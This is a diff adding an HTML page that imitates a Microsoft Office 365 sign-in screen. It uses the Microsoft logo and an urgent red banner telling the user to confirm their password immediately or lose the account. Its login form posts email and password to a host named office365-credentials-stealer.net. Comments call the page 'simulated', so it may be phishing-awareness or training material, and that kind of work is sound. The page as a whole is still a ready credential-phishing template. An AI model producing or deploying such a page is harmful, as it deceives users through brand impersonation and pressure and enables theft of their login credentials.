@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign in to your account</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      background-color: #e6e6e6;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #ffffff;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.1);
+      width: 440px;
+      padding: 44px;
+      border: 1px solid rgba(0,0,0,0.1);
+    }
+    .logo {
+      height: 24px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      font-weight: bold;
+      color: #747474;
+    }
+    .logo img {
+      height: 24px;
+      margin-right: 8px;
+    }
+    h1 {
+      font-size: 24px;
+      color: #1b1b1b;
+      margin: 0 0 16px 0;
+      font-weight: 600;
+    }
+    .urgency-alert {
+      color: #a80000;
+      font-size: 13px;
+      background-color: #fdf3f3;
+      padding: 10px;
+      border-left: 3px solid #d83b01;
+      margin-bottom: 20px;
+    }
+    .form-group {
+      margin-bottom: 16px;
+    }
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 8px 12px;
+      border: 1px solid #7a7a7a;
+      box-sizing: border-box;
+      font-size: 15px;
+      margin-top: 4px;
+    }
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      font-size: 13px;
+      margin-bottom: 20px;
+    }
+    .checkbox-group input {
+      margin-right: 8px;
+    }
+    .btn-submit {
+      background-color: #0067b8;
+      color: #ffffff;
+      border: none;
+      padding: 8px 16px;
+      font-size: 15px;
+      cursor: pointer;
+      min-width: 108px;
+    }
+    .btn-submit:hover {
+      background-color: #005da6;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <!-- Simulated Microsoft Brand marker -->
+      <img src="https://logodownload.org/wp-content/uploads/2014/04/microsoft-logo-2-1.png" alt="Microsoft logo">
+      <span>Microsoft Office 365</span>
+    </div>
+    
+    <h1>Sign in to your account</h1>
+    
+    <div class="urgency-alert">
+      <strong>Action Required:</strong> To prevent your <strong>account expiring</strong>, you must <strong>confirm password</strong> and <strong>verify immediately</strong>.
+    </div>
+
+    <!-- Simulated credentials harvesting form -->
+    <form action="http://office365-credentials-stealer.net/post.php" method="POST">
+      <div class="form-group">
+        <input type="email" placeholder="Email, phone, or Skype" required>
+      </div>
+      <div class="form-group">
+        <input type="password" placeholder="Password" required>
+      </div>
+      
+      <div class="checkbox-group">
+        <input type="checkbox" id="keep-signed-in">
+        <label for="keep-signed-in">Keep me signed in</label>
+      </div>
+
+      <div>
+        <button type="submit" class="btn-submit">Sign in</button>
+      </div>
+    </form>
+  </div>
+</body>
+</html>
